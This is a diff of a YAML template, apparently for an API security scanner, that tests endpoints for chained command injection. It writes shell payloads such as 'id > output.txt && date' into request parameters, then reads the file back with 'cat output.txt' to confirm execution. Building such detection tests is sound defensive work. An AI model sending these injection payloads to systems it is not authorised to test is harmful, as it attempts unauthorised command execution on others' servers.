@@ -1,10 +1,31 @@
 id: COMMAND_INJECTION_WITH_REDIRECTION_AND_VAR_MANIPULATION_CHAINED
 info:
-  name: "Command injection by using Redirection and Variable Manipulation with chained system commands"
-  description: "Command injection using redirection and variable manipulation with chained system commands involves exploiting vulnerabilities to execute commands that manipulate input and output streams. Attackers use redirection operators (e.g., `>`, `<`, `>>`) to control where the command output is sent or where input is sourced from, and they manipulate environment variables or command outputs to chain multiple commands. This approach allows attackers to execute complex sequences of commands, redirect data flow, and potentially exfiltrate or modify data, leading to significant security risks and system compromise."
+  name: "Command injection by using Redirection and Variable Manipulation with chained
+    system commands"
+  description: "Command injection using redirection and variable manipulation with
+    chained system commands involves exploiting vulnerabilities to execute commands
+    that manipulate input and output streams. Attackers use redirection operators
+    (e.g., `>`, `<`, `>>`) to control where the command output is sent or where input
+    is sourced from, and they manipulate environment variables or command outputs
+    to chain multiple commands. This approach allows attackers to execute complex
+    sequences of commands, redirect data flow, and potentially exfiltrate or modify
+    data, leading to significant security risks and system compromise."
   details: >
-    "Command injection with redirection and variable manipulation involves exploiting command injection vulnerabilities to control the flow of data and command execution. Attackers can use redirection operators like `>` or `<` to divert command output to files or read input from unexpected sources. By manipulating environment variables or command outputs, attackers can chain multiple commands to perform actions such as writing sensitive data to files, executing unauthorized scripts, or altering system configurations. This technique enables sophisticated attacks by leveraging command chaining and data redirection to exploit security weaknesses."
-  impact: "The impact of command injection using redirection and variable manipulation can be substantial, as it allows attackers to control and redirect data flows and command execution. This can lead to unauthorized data access, data loss, or system modification by writing sensitive information to files, executing unintended commands, or altering system settings. Such attacks can compromise the system's security, escalate privileges, and facilitate further exploitation or data breaches, posing a serious risk to the integrity and confidentiality of the affected system."
+    "Command injection with redirection and variable manipulation involves exploiting
+    command injection vulnerabilities to control the flow of data and command execution.
+    Attackers can use redirection operators like `>` or `<` to divert command output
+    to files or read input from unexpected sources. By manipulating environment variables
+    or command outputs, attackers can chain multiple commands to perform actions such
+    as writing sensitive data to files, executing unauthorized scripts, or altering
+    system configurations. This technique enables sophisticated attacks by leveraging
+    command chaining and data redirection to exploit security weaknesses."
+  impact: "The impact of command injection using redirection and variable manipulation
+    can be substantial, as it allows attackers to control and redirect data flows
+    and command execution. This can lead to unauthorized data access, data loss, or
+    system modification by writing sensitive information to files, executing unintended
+    commands, or altering system settings. Such attacks can compromise the system's
+    security, escalate privileges, and facilitate further exploitation or data breaches,
+    posing a serious risk to the integrity and confidentiality of the affected system."
   category:
     name: COMMAND_INJECTION
     shortName: Command Injection
@@ -12,16 +33,16 @@ info:
   subCategory: COMMAND_INJECTION_WITH_REDIRECTION_AND_VAR_MANIPULATION_CHAINED
   severity: CRITICAL
   tags:
-    - Business logic
-    - OWASP top 10
-    - HackerOne top 10
+  - Business logic
+  - OWASP top 10
+  - HackerOne top 10
   references:
-    - "https://twitter.com/trbughunters/status/1283133356922884096"
+  - "https://twitter.com/trbughunters/status/1283133356922884096"
   cwe:
-    - CWE-77
+  - CWE-77
   cve:
-    - CVE-2023-25826
-    - CVE-2023-41031
+  - CVE-2023-25826
+  - CVE-2023-41031
 
 attributes:
   nature: INTRUSIVE
@@ -39,137 +60,139 @@ api_selection_filters:
     length:
       gt: 0
     not_contains:
-      - Error
-      - Internal Server
-      - Failed
-      - Unauthorized
-      - access denied
-      - Forbidden
-      - Method Not allowed
-      - Gateway timeout
-      - request timeout
-      - server error
-      - server busy
-      - authentication error
-      - authorization error
-      - validation error
-      - Permission Denied
-      - invalid token
-      - token expired
-      - session expired
-      - session timeout
-      - unexpected error
-      - unable to process request
-      - bad request
-      - service unavailable
-      - account is locked
-      - account is blocked
-      - multiple failed attempts
+    - Error
+    - Internal Server
+    - Failed
+    - Unauthorized
+    - access denied
+    - Forbidden
+    - Method Not allowed
+    - Gateway timeout
+    - request timeout
+    - server error
+    - server busy
+    - authentication error
+    - authorization error
+    - validation error
+    - Permission Denied
+    - invalid token
+    - token expired
+    - session expired
+    - session timeout
+    - unexpected error
+    - unable to process request
+    - bad request
+    - service unavailable
+    - account is locked
+    - account is blocked
+    - multiple failed attempts
   or:
-    - request_payload:
-        for_one:
-          key:
-            regex: .*
-            extract: changed_body_key
-          value:
-            extract: changed_body_value
-    - query_param:
-        for_one:
-          key:
-            regex: .*
-            extract: changed_query_key
-          value:
-            regex: .*
-            extract: changed_query_value
+  - request_payload:
+      for_one:
+        key:
+          regex: .*
+          extractMultiple: changed_body_key
+        value:
+          extractMultiple: changed_body_value
+  - query_param:
+      for_one:
+        key:
+          regex: .*
+          extractMultiple: changed_query_key
+        value:
+          regex: .*
+          extractMultiple: changed_query_value
 wordLists:
   specialOSPayloads:
-    - "id > output.txt && date +\"%d-%B-%Y\" >> output.txt"
-    - "id >> output.txt && date +\"%d-%B-%Y\" >> output.txt"
+  - "id > output.txt && date +\"%d-%B-%Y\" >> output.txt"
+  - "id >> output.txt && date +\"%d-%B-%Y\" >> output.txt"
 execute:
   type: multiple
   requests:
-    - req:
-        - modify_body_param:
-            changed_body_key: ${specialOSPayloads}
-        - modify_query_param:
-            changed_query_key: ${specialOSPayloads}
-        - validate:
-            and:
-              - response_code:
-                  gte: 200
-                  lt: 300
-              - response_payload:
-                  length:
-                    gt: 0
-                  not_contains:
-                    - Error
-                    - fail
-                    - invalid
-                    - expired
-                    - not found
-                    - account is locked
-                    - account is blocked
-                    - rate-limit
-                    - rate_limit
-                    - rate limit
-                    - multiple failed attempt
-                    - <html>
-                    - </html>
-        - success: x2
-        - failure: exit
-    - req:
-        - modify_body_param:
-            changed_body_key: "cat output.txt"
-        - modify_query_param:
-            changed_query_key: "cat output.txt"
-        - validate:
-            response_payload:
-              length:
-                gt: 0
-              contains_all:
-                - "uid="
-                - "gid="
-                - "groups="
-              contains_either:
-                - "-January-"
-                - "-February-"
-                - "-March-"
-                - "-April-"
-                - "-May-"
-                - "-June-"
-                - "-July-"
-                - "-August-"
-                - "-September-"
-                - "-October-"
-                - "-November-"
-                - "-December-"
-              not_contains:
-                - Error
-                - Internal Server
-                - Failed
-                - Unauthorized
-                - access denied
-                - Forbidden
-                - Method Not allowed
-                - Gateway timeout
-                - request timeout
-                - server error
-                - server busy
-                - authentication error
-                - authorization error
-                - validation error
-                - Permission Denied
-                - invalid token
-                - token expired
-                - session expired
-                - session timeout
-                - unexpected error
-                - unable to process request
-                - bad request
-                - service unavailable
-                - account is locked
-                - account is blocked
-                - multiple failed attempts
-                - <html>
-                - </html>
-        - success: vulnerable
+  - req:
+    - for_each_combination: true
+    - modify_body_param:
+        ${changed_body_key}: ${specialOSPayloads}
+    - modify_query_param:
+        changed_query_key: ${specialOSPayloads}
+    - validate:
+        and:
+        - response_code:
+            gte: 200
+            lt: 300
+        - response_payload:
+            length:
+              gt: 0
+            not_contains:
+            - Error
+            - fail
+            - invalid
+            - expired
+            - not found
+            - account is locked
+            - account is blocked
+            - rate-limit
+            - rate_limit
+            - rate limit
+            - multiple failed attempt
+            - <html>
+            - </html>
+    - success: x2
+    - failure: exit
+  - req:
+    - for_each_combination: true
+    - modify_body_param:
+        ${changed_body_key}: "cat output.txt"
+    - modify_query_param:
+        changed_query_key: "cat output.txt"
+    - validate:
+        response_payload:
+          length:
+            gt: 0
+          contains_all:
+          - "uid="
+          - "gid="
+          - "groups="
+          contains_either:
+          - "-January-"
+          - "-February-"
+          - "-March-"
+          - "-April-"
+          - "-May-"
+          - "-June-"
+          - "-July-"
+          - "-August-"
+          - "-September-"
+          - "-October-"
+          - "-November-"
+          - "-December-"
+          not_contains:
+          - Error
+          - Internal Server
+          - Failed
+          - Unauthorized
+          - access denied
+          - Forbidden
+          - Method Not allowed
+          - Gateway timeout
+          - request timeout
+          - server error
+          - server busy
+          - authentication error
+          - authorization error
+          - validation error
+          - Permission Denied
+          - invalid token
+          - token expired
+          - session expired
+          - session timeout
+          - unexpected error
+          - unable to process request
+          - bad request
+          - service unavailable
+          - account is locked
+          - account is blocked
+          - multiple failed attempts
+          - <html>
+          - </html>
+    - success: vulnerable
